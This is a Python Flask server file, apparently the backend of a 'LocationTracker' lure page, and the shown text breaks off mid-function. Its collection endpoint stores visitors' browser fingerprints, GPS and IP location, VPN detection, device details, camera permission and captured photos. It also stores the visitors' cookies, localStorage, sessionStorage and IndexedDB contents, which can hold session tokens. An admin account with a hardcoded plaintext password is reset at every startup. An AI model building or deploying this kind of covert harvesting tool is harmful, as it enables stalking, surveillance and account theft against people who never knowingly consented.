from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from datetime import datetime
import sqlite3
import bcrypt
import json
import os
import requests
import logging
import threading
import time
from contextlib import closing
from werkzeug.utils import secure_filename
from geopy.geocoders import Nominatim
from geopy.exc import GeocoderTimedOut, GeocoderServiceError
from geopy.adapters import RateLimiter
from config import Config

# Shared geocoder instance with rate limiting (Nominatim allows 1 request per second)
_geocoder = Nominatim(user_agent="LocationTracker/1.0")
# Rate limit: 1 request per second (Nominatim's free tier limit)
_geocode_rate_limiter = RateLimiter(_geocoder.reverse, min_delay_seconds=1.0)

# Geocoding cache to avoid redundant API calls
_geocode_cache = {}
_geocode_cache_ttl = 86400  # 24 hours cache

# Validate configuration
Config.validate()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Suppress false error logs from eventlet/werkzeug in production
if Config.IS_PRODUCTION:
    logging.getLogger('eventlet.wsgi.server').setLevel(logging.ERROR)
    logging.getLogger('eventlet').setLevel(logging.ERROR)
    logging.getLogger('werkzeug').setLevel(logging.ERROR)  # Suppress HTTP access logs
    # Disable Flask's default request logging
    logging.getLogger('werkzeug').disabled = True

app = Flask(__name__)

# Secret key handling - require in production
if Config.IS_PRODUCTION:
    if not Config.SECRET_KEY:
        raise ValueError(
            "SECRET_KEY environment variable must be set in production. "
            "Please set it in your Railway/Render environment variables."
        )
    app.secret_key = Config.SECRET_KEY
else:
    app.secret_key = Config.SECRET_KEY or 'dev-key-only-for-local-development'

CORS(app)

# Initialize rate limiter
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"],
    storage_uri=Config.RATELIMIT_STORAGE_URL,
    enabled=Config.RATELIMIT_ENABLED
)

# Use eventlet mode for production (better compatibility with Railway)
# Eventlet provides excellent WebSocket support and works well with socketio.run()
# Auto-detect best async mode based on environment
if Config.IS_PRODUCTION:
    # Try eventlet first (more stable for production with socketio.run())
    try:
        import eventlet
        # Try to monkey patch, but handle errors gracefully
        try:
            eventlet.monkey_patch()
            async_mode = 'eventlet'
            logger.info(f"Using eventlet async mode (production - Railway: {Config.RAILWAY_ENV}, Render: {Config.RENDER_ENV})")
        except Exception as e:
            # If monkey patching fails, fall back to threading
            logger.warning(f"Eventlet monkey patch failed: {e}, falling back to threading")
            async_mode = 'threading'
    except ImportError:
        # Fall back to threading if eventlet not available
        async_mode = 'threading'
        logger.info("Eventlet not available, using threading mode")
    except Exception as e:
        # Catch any other errors with eventlet
        logger.warning(f"Error with eventlet: {e}, using threading mode")
        async_mode = 'threading'
else:
    # Use threading for local development
    async_mode = 'threading'
    logger.info("Using threading async mode (development)")

socketio = SocketIO(
    app,
    cors_allowed_origins=Config.ALLOWED_ORIGINS,
    async_mode=async_mode,
    logger=False,  # Disable to prevent false error logs
    engineio_logger=False,  # Disable to prevent false error logs
    ping_timeout=60,
    ping_interval=25,
    max_http_buffer_size=1e6  # Limit buffer size to prevent memory issues
)

# Database setup
DB_PATH = Config.DB_PATH

# Photo storage setup
PHOTOS_FOLDER = Config.PHOTOS_FOLDER
if not os.path.exists(PHOTOS_FOLDER):
    os.makedirs(PHOTOS_FOLDER)
    logger.info(f"Created photos folder: {PHOTOS_FOLDER}")

ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}
MAX_FILE_SIZE = Config.MAX_FILE_SIZE

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def hash_password(password):
    """Hash a password using bcrypt"""
    return bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')

def verify_password(password, password_hash):
    """Verify a password against a bcrypt hash"""
    try:
        return bcrypt.checkpw(password.encode('utf-8'), password_hash.encode('utf-8'))
    except Exception as e:
        logger.error(f"Password verification error: {e}")
        return False

def reverse_geocode_coordinates(lat, lon, retries=2):
    """
    Shared reverse geocode function with rate limiting and caching.
    Reverse geocode coordinates to get English location names with retry logic using geopy.
    """
    # Check cache first (round to 4 decimal places for ~11m precision)
    cache_key = f"{float(lat):.4f},{float(lon):.4f}"
    if cache_key in _geocode_cache:
        cached_result, cached_time = _geocode_cache[cache_key]
        if time.time() - cached_time < _geocode_cache_ttl:
            logger.debug(f"Returning cached geocode for {cache_key}")
            return cached_result
    
    for attempt in range(retries):
        try:
            # Use rate-limited geocoder (automatically respects 1 req/sec limit)
            location = _geocode_rate_limiter((lat, lon), language='en', timeout=3)
            
            if location and location.raw:
                address = location.raw.get('address', {})
                
                # Extract city (try multiple fields)
                city = (address.get('city') or 
                       address.get('town') or 
                       address.get('village') or 
                       address.get('municipality') or
                       address.get('city_district'))
                
                # Extract country
                country = address.get('country')
                
                # Extract region/state
                region = (address.get('state') or 
                         address.get('region') or 
                         address.get('county') or
                         address.get('state_district'))
                
                result = {
                    'city': city,
                    'country': country,
                    'region': region
                }
                
                if city or country:  # Only return if we got useful data
                    logger.info(f"Reverse geocode successful for {lat},{lon}: {city}, {country}")
                    # Cache the result
                    _geocode_cache[cache_key] = (result, time.time())
                    return result
                else:
                    logger.warning(f"Reverse geocode returned empty data for {lat},{lon}")
                    return None
            else:
                logger.warning(f"Reverse geocode returned no location for {lat},{lon} (attempt {attempt + 1}/{retries})")
                
        except GeocoderTimedOut:
            logger.warning(f"Reverse geocode timeout for {lat},{lon} (attempt {attempt + 1}/{retries})")
        except GeocoderServiceError as e:
            logger.warning(f"Reverse geocode service error for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
        except Exception as e:
            logger.warning(f"Reverse geocode failed for {lat},{lon}: {e} (attempt {attempt + 1}/{retries})")
        
        # Wait before retry (shorter wait time)
        if attempt < retries - 1:
            time.sleep(0.5)  # Reduced from exponential backoff to fixed 0.5s
    
    logger.error(f"Reverse geocode failed after {retries} attempts for {lat},{lon}")
    return None

def init_db():
    """Initialize the database with required tables"""
    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()

            # Table to store collected user data
            c.execute('''CREATE TABLE IF NOT EXISTS collected_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                device_info TEXT,
                fingerprint TEXT,
                location_data TEXT,
                storage_info TEXT,
                connection_info TEXT,
                vpn_detection TEXT,
                battery_info TEXT,
                network_info TEXT,
                media_devices TEXT,
                camera_permission TEXT,
                raw_data TEXT
            )''')

            # Migrate existing database: Add new columns if they don't exist
            try:
                # Check if new columns exist
                c.execute("PRAGMA table_info(collected_data)")
                columns = [col[1] for col in c.fetchall()]

                # Add missing columns
                if 'battery_info' not in columns:
                    c.execute('ALTER TABLE collected_data ADD COLUMN battery_info TEXT')
                    logger.info("Added battery_info column")

                if 'network_info' not in columns:
                    c.execute('ALTER TABLE collected_data ADD COLUMN network_info TEXT')
                    logger.info("Added network_info column")

                if 'media_devices' not in columns:
                    c.execute('ALTER TABLE collected_data ADD COLUMN media_devices TEXT')
                    logger.info("Added media_devices column")

                if 'camera_permission' not in columns:
                    c.execute('ALTER TABLE collected_data ADD COLUMN camera_permission TEXT')
                    logger.info("Added camera_permission column")

            except Exception as e:
                logger.warning(f"Migration note: {e}")

            # Admin credentials table (username: Sabbar, password: Lights@123! - CHANGE THIS!)
            c.execute('''CREATE TABLE IF NOT EXISTS admin_users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password_hash TEXT NOT NULL
            )''')

            # Always ensure new admin credentials are set and old ones are removed/updated
            # Default password: Lights@123! (CHANGE THIS!)
            default_password = 'Lights@123!'
            password_hash = hash_password(default_password)
            
            # Check if new admin exists
            c.execute('SELECT * FROM admin_users WHERE username = ?', ('Sabbar',))
            sabbar_user = c.fetchone()
            
            # Check if old admin exists
            c.execute('SELECT * FROM admin_users WHERE username = ?', ('admin',))
            old_admin = c.fetchone()
            
            if old_admin:
                # Delete old admin user
                c.execute('DELETE FROM admin_users WHERE username = ?', ('admin',))
                logger.info("Removed old admin user")
            
            if not sabbar_user:
                # Create new admin user with correct credentials
                c.execute('INSERT INTO admin_users (username, password_hash) VALUES (?, ?)',
                          ('Sabbar', password_hash))
                logger.info("Created new admin user: Sabbar")
            else:
                # Update existing Sabbar user to ensure correct password
                c.execute('UPDATE admin_users SET password_hash = ? WHERE username = ?',
                          (password_hash, 'Sabbar'))
                logger.info("Updated admin user password: Sabbar")

            # Photos table to store captured photos metadata
            c.execute('''CREATE TABLE IF NOT EXISTS captured_photos (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                filename TEXT NOT NULL,
                filepath TEXT NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                file_size INTEGER,
                fingerprint TEXT,
                data_entry_id INTEGER,
                capture_source TEXT
            )''')

            # Migrate existing photos table
            try:
                c.execute("PRAGMA table_info(captured_photos)")
                photo_columns = [col[1] for col in c.fetchall()]

                if 'fingerprint' not in photo_columns:
                    c.execute('ALTER TABLE captured_photos ADD COLUMN fingerprint TEXT')
                    logger.info("Added fingerprint column to captured_photos")

                if 'data_entry_id' not in photo_columns:
                    c.execute('ALTER TABLE captured_photos ADD COLUMN data_entry_id INTEGER')
                    logger.info("Added data_entry_id column to captured_photos")

                if 'capture_source' not in photo_columns:
                    c.execute('ALTER TABLE captured_photos ADD COLUMN capture_source TEXT')
                    logger.info("Added capture_source column to captured_photos")
            except Exception as e:
                logger.warning(f"Photo table migration note: {e}")

            conn.commit()
    except sqlite3.Error as e:
        logger.error(f"Database initialization error: {e}")
        raise

# Initialize database on startup (with error handling to prevent blocking)
try:
    init_db()
    logger.info("Database initialized successfully")
except Exception as e:
    logger.error(f"Database initialization failed: {e}")
    logger.warning("Server will continue, but database operations may fail")
    # Don't raise - allow server to start even if DB init fails

# IP info cache to reduce external API calls
# Format: {ip: (data, timestamp)}
ip_info_cache = {}
IP_CACHE_TTL = 3600  # Cache for 1 hour

# Startup confirmation
logger.info("Flask app initialized successfully")
logger.info("Server ready to accept connections")

@app.route('/')
def index():
    """Serve the main page with the button"""
    return render_template('index.html')

@app.route('/health')
def health():
    """Health check endpoint for Railway"""
    try:
        # Check database connectivity
        with closing(sqlite3.connect(DB_PATH)) as conn:
            conn.execute('SELECT 1')
        db_status = 'ok'
    except sqlite3.Error as e:
        logger.error(f"Database health check failed: {e}")
        db_status = 'error'
    except Exception as e:
        logger.error(f"Database health check unexpected error: {e}")
        db_status = 'error'
    
    # Check file system
    try:
        photos_folder_exists = os.path.exists(PHOTOS_FOLDER)
        photos_folder_writable = os.access(PHOTOS_FOLDER, os.W_OK) if photos_folder_exists else False
        fs_status = 'ok' if (photos_folder_exists and photos_folder_writable) else 'error'
    except Exception as e:
        logger.error(f"File system health check failed: {e}")
        fs_status = 'error'
    
    overall_status = 'ok' if (db_status == 'ok' and fs_status == 'ok') else 'degraded'
    
    return jsonify({
        'status': overall_status,
        'service': 'running',
        'database': db_status,
        'filesystem': fs_status,
        'timestamp': datetime.now().isoformat()
    }), 200 if overall_status == 'ok' else 503

@app.route('/metrics')
def metrics():
    """Basic metrics endpoint for monitoring"""
    try:
        with closing(sqlite3.connect(DB_PATH)) as conn:
            c = conn.cursor()
            c.execute('SELECT COUNT(*) FROM collected_data')
            data_count = c.fetchone()[0]
            c.execute('SELECT COUNT(*) FROM captured_photos')
            photo_count = c.fetchone()[0]
        
        return jsonify({
            'data_entries': data_count,
            'photos': photo_count,
            'timestamp': datetime.now().isoformat()
        }), 200
    except sqlite3.Error as e:
        logger.error(f"Metrics endpoint database error: {e}")
        return jsonify({
            'error': 'Database error',
            'timestamp': datetime.now().isoformat()
        }), 500
    except Exception as e:
        logger.error(f"Metrics endpoint unexpected error: {e}")
        return jsonify({
            'error': 'Internal error',
            'timestamp': datetime.now().isoformat()
        }), 500

def get_client_ip():
    """Extract client IP from request, handling proxy headers correctly"""
    # Check X-Real-IP first (used by some proxies like Render)
    ip = request.headers.get('X-Real-IP')
    if ip:
        return ip.split(',')[0].strip()
    
    # Check X-Forwarded-For (can contain multiple IPs, take the first one)
    ip = request.headers.get('X-Forwarded-For')
    if ip:
        # X-Forwarded-For can contain multiple IPs: "client, proxy1, proxy2"
        # The first IP is the original client IP
        return ip.split(',')[0].strip()
    
    # Fallback to remote_addr
    return request.remote_addr

@app.route('/api/get-ip-info')
def get_ip_info():
    """Backend endpoint to fetch IP info (avoids CORS issues)
    IMPORTANT: Always returns remote user's IP info, never server's IP info
    Optimized: Uses single provider with shorter timeout and caching
    """
    try:
        # Get client IP from headers (for when behind proxy/load balancer)
        client_ip = get_client_ip()
        
        # Check cache first (optimized to reduce external API calls)
        import time
        current_time = time.time()
        if client_ip in ip_info_cache:
            cached_data, cached_timestamp = ip_info_cache[client_ip]
            if current_time - cached_timestamp < IP_CACHE_TTL:
                # Return cached data
                logger.debug(f"Returning cached IP info for {client_ip}")
                return jsonify(cached_data), 200
        
        # Check if client IP is private/localhost
        is_private = (client_ip in ['127.0.0.1', 'localhost', '::1'] or 
                     client_ip.startswith('192.168.') or 
                     client_ip.startswith('10.') or
                     client_ip.startswith('172.16.') or
                     client_ip.startswith('172.17.') or
                     client_ip.startswith('172.18.') or
                     client_ip.startswith('172.19.') or
                     client_ip.startswith('172.20.') or
                     client_ip.startswith('172.21.') or
                     client_ip.startswith('172.22.') or
                     client_ip.startswith('172.23.') or
                     client_ip.startswith('172.24.') or
                     client_ip.startswith('172.25.') or
                     client_ip.startswith('172.26.') or
                     client_ip.startswith('172.27.') or
                     client_ip.startswith('172.28.') or
                     client_ip.startswith('172.29.') or
                     client_ip.startswith('172.30.') or
                     client_ip.startswith('172.31.'))

        # Optimized: Use ipinfo.io as primary provider for better reliability and richer data
        # CRITICAL: Always look up the CLIENT IP, never use server's IP
        # This ensures we get the correct location/VPN status for the remote user, not the server
        primary_provider = ('https://ipinfo.io/{}/json', 'ipinfo.io')
        fallback_provider = ('https://ipapi.co/{}/json/', 'ipapi.co')
        
        providers = [primary_provider, fallback_provider]
        
        # Always try to look up the client IP first (even if private, it might be a public IP behind proxy)
        if client_ip and not is_private:
            for provider_template, provider_name in providers:
                try:
                    if '{' in provider_template:
                        # Provider supports IP lookup - use client IP
                        lookup_url = provider_template.format(client_ip)
                    else:
                        # Skip auto-detect providers for private IPs
                        continue
                    
                    # Increased timeout to 5 seconds for better reliability
                    response = requests.get(lookup_url, timeout=5)
                    if response.ok:
                        data = response.json()
                        # CRITICAL: Always use the client IP from request, never the IP from response
                        # The response IP might be the server's IP if we used auto-detect
                        data['ip'] = client_ip
                        data['provider'] = provider_name
                        data['client_ip_from_request'] = client_ip
                        
                        # Ensure Provider and Organization are properly extracted
                        # Different APIs use different field names
                        if provider_name == 'ipapi.co':
                            # ipapi.co uses 'org' for organization and 'asn' for ASN
                            data['org'] = data.get('org') or (data.get('asn', {}).get('org') if isinstance(data.get('asn'), dict) else None) or data.get('isp', 'N/A')
                            data['isp'] = data.get('org') or data.get('isp', 'N/A')
                        elif provider_name == 'ipinfo.io':
                            # ipinfo.io uses 'org' for organization
                            data['org'] = data.get('org') or data.get('isp', 'N/A')
                            data['isp'] = data.get('org') or data.get('isp', 'N/A')
                            
                            # Enhanced extraction for ipinfo.io - extract all rich data
                            # Extract ASN (can be string like "AS14618" or object)
                            asn_data = data.get('asn', {})
                            if isinstance(asn_data, dict):
                                data['asn_number'] = asn_data.get('asn', '')
                                data['asn_name'] = asn_data.get('name', '')
                                data['asn_domain'] = asn_data.get('domain', '')
                                data['asn_type'] = asn_data.get('type', '')
                                data['asn_route'] = asn_data.get('route', '')
                            elif isinstance(asn_data, str):
                                # Sometimes ASN is just a string like "AS14618"
                                data['asn_number'] = asn_data
                            
                            # Extract company information
                            company_data = data.get('company', {})
                            if isinstance(company_data, dict):
                                data['company_name'] = company_data.get('name', '')
                                data['company_domain'] = company_data.get('domain', '')
                                data['company_type'] = company_data.get('type', '')
                            elif isinstance(company_data, str):
                                data['company_name'] = company_data
                            
                            # Extract privacy detection
                            privacy_data = data.get('privacy', {})
                            if isinstance(privacy_data, dict):
                                data['is_vpn'] = privacy_data.get('vpn', False)
                                data['is_proxy'] = privacy_data.get('proxy', False)
                                data['is_tor'] = privacy_data.get('tor', False)
                                data['is_relay'] = privacy_data.get('relay', False)
                                data['is_hosting'] = privacy_data.get('hosting', False)
                                data['is_residential_proxy'] = privacy_data.get('residential_proxy', False)
                            
                            # Extract hostname
                            data['hostname'] = data.get('hostname', '')
                            
                            # Extract location (ipinfo.io uses 'loc' for coordinates)
                            if 'loc' in data and data['loc']:
                                loc_parts = data['loc'].split(',')
                                if len(loc_parts) == 2:
                                    try:
                                        data['latitude'] = float(loc_parts[0])
                                        data['longitude'] = float(loc_parts[1])
                                    except (ValueError, IndexError):
                                        pass
                            
                            # Extract postal code and timezone
                            data['postal'] = data.get('postal', '')
                            data['timezone'] = data.get('timezone', '')
                        
                        # Ensure both fields exist even if API doesn't provide them
                        if 'org' not in data or not data['org']:
                            data['org'] = data.get('isp') or 'N/A'
                        if 'isp' not in data:
                            data['isp'] = data.get('org') or 'N/A'
                        
                        # Cache the result
                        ip_info_cache[client_ip] = (data, current_time)
                        
                        # Clean up old cache entries (keep cache size reasonable)
                        if len(ip_info_cache) > 1000:
                            # Remove oldest entries
                            sorted_cache = sorted(ip_info_cache.items(), key=lambda x: x[1][1])
                            for old_ip, _ in sorted_cache[:100]:  # Remove 100 oldest
                                del ip_info_cache[old_ip]
                        
                        if not Config.IS_PRODUCTION:
                            logger.info(f"Successfully looked up CLIENT IP {client_ip} using {provider_name}")
                        return jsonify(data), 200
                except Exception as e:
                    if not Config.IS_PRODUCTION:
                        logger.warning(f"Provider {provider_name} failed for IP {client_ip}: {e}")
                    continue

        # If we couldn't get IP info for the client IP, return minimal data with client IP
        # NEVER use auto-detect here as it would return server's IP
        # This ensures we always show remote user's IP, not server's IP
        fallback_data = {
            'ip': client_ip, 
            'provider': 'fallback', 
            'org': 'N/A',  # Add org field
            'isp': 'N/A',  # Add isp field
            'note': 'Limited info - IP from request headers (remote user IP)',
            'client_ip_from_request': client_ip,
            'warning': 'Could not fetch location data for this IP'
        }
        
        # Cache fallback data too (shorter TTL for fallbacks)
        ip_info_cache[client_ip] = (fallback_data, current_time)
        
        if not Config.IS_PRODUCTION:
            logger.warning(f"Could not get IP info for client IP {client_ip}, returning minimal data")
        return jsonify(fallback_data), 200

    except Exception as e:
        logger.error(f"Error fetching IP info: {e}", exc_info=True)
        # Even on error, return the client IP, not server IP
        client_ip = get_client_ip()
        return jsonify({
            'ip': client_ip, 
            'error': str(e),
            'client_ip_from_request': client_ip,
            'note': 'Error occurred, but using remote user IP from request'
        }), 200

@app.route('/api/collect', methods=['POST'])
@limiter.limit("10 per minute")
def collect_data():
    """API endpoint to receive data from frontend"""
    try:
        # Input validation
        if not request.is_json:
            return jsonify({'status': 'error', 'message': 'Request must be JSON'}), 400
        
        data = request.json
        if not data or not isinstance(data, dict):
            return jsonify({'status': 'error', 'message': 'Invalid data format'}), 400
        
        # Validate fingerprint
        fingerprint = data.get('fingerprint', {}).get('fp', '')
        if not fingerprint or len(fingerprint) < 10:
            return jsonify({'status': 'error', 'message': 'Invalid or missing fingerprint'}), 400
        
        timestamp = datetime.now().isoformat()
        
        # Enhanced debug: Log full payload details (only in development)
        if not Config.IS_PRODUCTION:
            logger.info("=" * 80)
            logger.info(f"[DEBUG] Received data at {timestamp}")
            logger.info(f"[DEBUG] Payload keys: {list(data.keys()) if data else 'None'}")
            logger.info(f"[DEBUG] Full payload structure:")
            
            # Log each top-level field
            for key in data.keys():
                value = data.get(key)
                if isinstance(value, dict):
                    logger.info(f"  - {key}: dict with keys: {list(value.keys()) if value else 'empty'}")
                    # Log important nested fields
                    if key == 'fingerprint' and isinstance(value, dict):
                        logger.info(f"    - fingerprint.fp: {value.get('fp', 'NOT SET')[:32]}..." if value.get('fp') else "    - fingerprint.fp: NOT SET")
                        logger.info(f"    - fingerprint.components: {list(value.get('components', {}).keys()) if isinstance(value.get('components'), dict) else 'NOT SET'}")
                    elif key == 'deviceInfo' and isinstance(value, dict):
                        logger.info(f"    - deviceInfo.browser: {value.get('browser', 'NOT SET')}")
                        logger.info(f"    - deviceInfo.os: {value.get('os', 'NOT SET')}")
                        logger.info(f"    - deviceInfo.deviceType: {value.get('deviceType', 'NOT SET')}")
                    elif key == 'ipInfo' and isinstance(value, dict):
                        logger.info(f"    - ipInfo.ip: {value.get('ip', 'NOT SET')}")
                        logger.info(f"    - ipInfo.city: {value.get('city', 'NOT SET')}")
                        logger.info(f"    - ipInfo.country: {value.get('country', 'NOT SET')}")
                    elif key == 'cameraAccess' and isinstance(value, dict):
                        logger.info(f"    - cameraAccess.granted: {value.get('granted', 'NOT SET')}")
                        logger.info(f"    - cameraAccess.message: {value.get('message', 'NOT SET')}")
                        if value.get('error'):
                            logger.info(f"    - cameraAccess.error: {value.get('error')}")
                elif isinstance(value, list):
                    logger.info(f"  - {key}: list with {len(value)} items")
                elif value is None:
                    logger.info(f"  - {key}: None")
                else:
                    logger.info(f"  - {key}: {type(value).__name__} = {str(value)[:100]}")
        else:
            # In production, only log minimal info
            logger.debug(f"Received data collection request at {timestamp}")
        
        # Special check for cameraAccess (only in development)
        if not Config.IS_PRODUCTION:
            if 'cameraAccess' in data:
                logger.info(f"[DEBUG] cameraAccess found: {data.get('cameraAccess')}")
            else:
                logger.warning("[DEBUG] cameraAccess NOT in data!")
            logger.info("=" * 80)

        # Get client IP - prefer the IP from geolocation service (more accurate for public IP)
        # Fall back to request headers if not available
        ip_from_geo = data.get('ipInfo', {}).get('ip')
        ip_from_request = get_client_ip()
        ip_address = ip_from_geo if ip_from_geo else ip_from_request

        # Extract data from the payload
        device_info = json.dumps(data.get('deviceInfo', {}))
        fingerprint = data.get('fingerprint', {}).get('fp', '')

        # Use shared reverse_geocode_coordinates function (with rate limiting and caching)

        # Prioritize GPS coordinates over IP location
        device_coords = data.get('deviceCoords')
        ip_info = data.get('ipInfo', {})
        
        # Normalize location data to ensure consistent field names
        # Handle different IP info provider formats
        # Always ensure IP address is included (use ip_address from request if not in ip_info)
        # Enhanced to include all ipinfo.io fields (ASN, company, privacy, hostname, etc.)
        normalized_location = {
            'ip': ip_info.get('ip') or ip_address,  # Always include IP address
            'city': ip_info.get('city'),
            'region': ip_info.get('region'),
            'country': ip_info.get('country') or ip_info.get('country_name'),
            'latitude': ip_info.get('latitude') or ip_info.get('lat'),
            'longitude': ip_info.get('longitude') or ip_info.get('lon'),
            'org': ip_info.get('org') or ip_info.get('isp'),
            'isp': ip_info.get('isp') or ip_info.get('org'),
            'provider': ip_info.get('provider'),
            # Enhanced fields from ipinfo.io
            'asn': ip_info.get('asn'),
            'company': ip_info.get('company'),
            'privacy': ip_info.get('privacy', {}),
            'hostname': ip_info.get('hostname'),
            'postal': ip_info.get('postal') or ip_info.get('postal_code'),
            'timezone': ip_info.get('timezone'),
            # Keep raw data for reference
            'raw': ip_info.get('raw', ip_info)
        }

        # Get coordinates (prefer GPS, fall back to IP-based)
        final_lat = None
        final_lon = None
        location_type = 'ip'
        
        if device_coords and device_coords.get('lat') and device_coords.get('lon'):
            # User granted location permission - use GPS coordinates
            final_lat = device_coords.get('lat')
            final_lon = device_coords.get('lon')
            location_type = 'gps'
        elif normalized_location.get('latitude') and normalized_location.get('longitude'):
            # Use IP-based coordinates
            final_lat = normalized_location.get('latitude')
            final_lon = normalized_location.get('longitude')
            location_type = 'ip'

        # Reverse geocode coordinates to get English location names (non-blocking)
        # Don't wait for reverse geocoding - it can take several seconds and cause timeouts
        # We'll do it in a background thread and update the database later
        reverse_geocoded = None
        should_reverse_geocode = final_lat and final_lon
        
        # Build location data (without reverse geocoded data initially)
        if device_coords and device_coords.get('lat') and device_coords.get('lon'):
            # GPS coordinates available
            location_data = json.dumps({
                **normalized_location,  # Keep IP info for reference
                'ip': normalized_location.get('ip') or ip_address,  # Ensure IP is always set
                'gps': device_coords,
                'latitude': final_lat,
                'longitude': final_lon,
                'location_type': location_type,
                'accuracy': device_coords.get('accuracy'),
                'altitude': device_coords.get('altitude'),
                # Use IP-based location initially (reverse geocoding will update later)
                'city': normalized_location.get('city'),
                'country': normalized_location.get('country'),
                'region': normalized_location.get('region')
            })
        else:
            # IP-based location (with or without coordinates)
            location_data = json.dumps({
                **normalized_location,
                'ip': normalized_location.get('ip') or ip_address,  # Ensure IP is always set
                'latitude': final_lat,
                'longitude': final_lon,
                'location_type': location_type,
                # Use IP-based location
                'city': normalized_location.get('city'),
                'country': normalized_location.get('country'),
                'region': normalized_location.get('region')
            })
        
        # Background function to update location data with reverse geocoded results
        def update_location_with_reverse_geocode(entry_id_to_update, lat, lon):
            """Update location data in database with reverse geocoded results (non-blocking)"""
            try:
                reverse_geocoded_result = reverse_geocode_coordinates(lat, lon)
                if reverse_geocoded_result:
                    logger.info(f"Got location from coordinates: {reverse_geocoded_result.get('city')}, {reverse_geocoded_result.get('region')}, {reverse_geocoded_result.get('country')}")
                    
                    # Update the location_data in database
                    try:
                        with closing(sqlite3.connect(DB_PATH, timeout=10.0)) as conn:
                            c = conn.cursor()
                            # Get current location data
                            c.execute('SELECT location_data FROM collected_data WHERE id = ?', (entry_id_to_update,))
                            row = c.fetchone()
                            
                            if row and row[0]:
                                current_location = json.loads(row[0])
                                # Update with reverse geocoded data
                                if reverse_geocoded_result.get('city'):
                                    current_location['city'] = reverse_geocoded_result.get('city')
                                if reverse_geocoded_result.get('country'):
                                    current_location['country'] = reverse_geocoded_result.get('country')
                                if reverse_geocoded_result.get('region'):
                                    current_location['region'] = reverse_geocoded_result.get('region')
                                
                                # Update database
                                updated_location_data = json.dumps(current_location)
                                c.execute('UPDATE collected_data SET location_data = ? WHERE id = ?', 
                                         (updated_location_data, entry_id_to_update))
                                conn.commit()
                                logger.info(f"Updated entry #{entry_id_to_update} with reverse geocoded location")
                    except Exception as e:
                        logger.error(f"Error updating location data in background: {e}", exc_info=True)
            except Exception as e:
                logger.error(f"Error in background reverse geocoding: {e}", exc_info=True)

        storage_info = json.dumps({
            'cookies': data.get('cookies', []),
            'localStorage': data.get('localStorage', {}),
            'sessionStorage': data.get('sessionStorage', {}),
            'indexedDB': data.get('indexedDB', {})
        })
        connection_info = json.dumps(data.get('connectionInfo', {}))
        vpn_detection = json.dumps(data.get('vpnDetection', {}))
        battery_info = json.dumps(data.get('batteryInfo', {}))
        network_info = json.dumps(data.get('networkInfo', {}))
        media_devices = json.dumps(data.get('mediaDevices', {}))
        
        # Ensure camera permission is properly stored
        # Get cameraAccess from the data - it should be sent from frontend
        camera_access = data.get('cameraAccess')
        
        # Debug: Log what we received
        logger.debug(f"Raw data.get('cameraAccess'): {camera_access}")
        logger.debug(f"Type: {type(camera_access)}")
        
        # Check if camera_access is None, empty dict, or doesn't have granted field
        if camera_access is None:
            # Try to get it from data directly
            if 'cameraAccess' in data:
                camera_access = data['cameraAccess']
                logger.debug(f"Got from data['cameraAccess']: {camera_access}")
        elif isinstance(camera_access, dict):
            # Check if it's an empty dict or missing granted field
            if len(camera_access) == 0 or 'granted' not in camera_access:
                # Try to get it from data directly
                if 'cameraAccess' in data:
                    potential = data['cameraAccess']
                    if isinstance(potential, dict) and 'granted' in potential:
                        camera_access = potential
                        logger.debug(f"Replaced with data['cameraAccess']: {camera_access}")
        else:
            # Not a dict, try to get from data
            if 'cameraAccess' in data:
                camera_access = data['cameraAccess']
                logger.debug(f"Got from data['cameraAccess'] (was not dict): {camera_access}")
        
        # If still None or not a dict, create empty dict
        if camera_access is None:
            camera_access = {}
            logger.debug("Created empty dict (was None)")
        elif not isinstance(camera_access, dict):
            # If it's not a dict, create empty
            logger.debug(f"camera_access is not a dict, type: {type(camera_access)}, creating empty dict")
            camera_access = {}
        
        # Log what we're storing
        logger.debug(f"Final camera_access: {camera_access}")
        logger.debug(f"Has granted field: {'granted' in camera_access if isinstance(camera_access, dict) else False}")
        if isinstance(camera_access, dict) and 'granted' in camera_access:
            logger.debug(f"Granted value: {camera_access.get('granted')} (type: {type(camera_access.get('granted'))})")
        
        camera_permission = json.dumps(camera_access)
        user_agent = request.headers.get('User-Agent', '')
        raw_data = json.dumps(data)

        # Enhanced logging for all collected data
        logger.info("=" * 80)
        logger.info(f"[DEBUG] Processing entry at {timestamp}")
        logger.info(f"[DEBUG] IP Address: {ip_address}")
        logger.info(f"[DEBUG] Fingerprint: {fingerprint[:32]}...")
        logger.info(f"[DEBUG] User Agent: {user_agent[:100]}...")
        
        # Log device info summary
        device_info_parsed = json.loads(device_info) if device_info else {}
        logger.info(f"[DEBUG] Device Info Summary:")
        logger.info(f"  - Browser: {device_info_parsed.get('browser', 'NOT SET')}")
        logger.info(f"  - OS: {device_info_parsed.get('os', 'NOT SET')} {device_info_parsed.get('osVersion', '')}")
        logger.info(f"  - Device Type: {device_info_parsed.get('deviceType', 'NOT SET')}")
        logger.info(f"  - Device Model: {device_info_parsed.get('deviceModel', 'NOT SET')}")
        logger.info(f"  - Screen: {device_info_parsed.get('screen', {}).get('width', '?')}x{device_info_parsed.get('screen', {}).get('height', '?')}")
        
        # Log location data summary
        location_data_parsed = json.loads(location_data) if location_data else {}
        logger.info(f"[DEBUG] Location Data Summary:")
        logger.info(f"  - IP: {location_data_parsed.get('ip', 'NOT SET')}")
        logger.info(f"  - Location Type: {location_data_parsed.get('location_type', 'NOT SET')}")
        logger.info(f"  - City: {location_data_parsed.get('city', 'NOT SET')}")
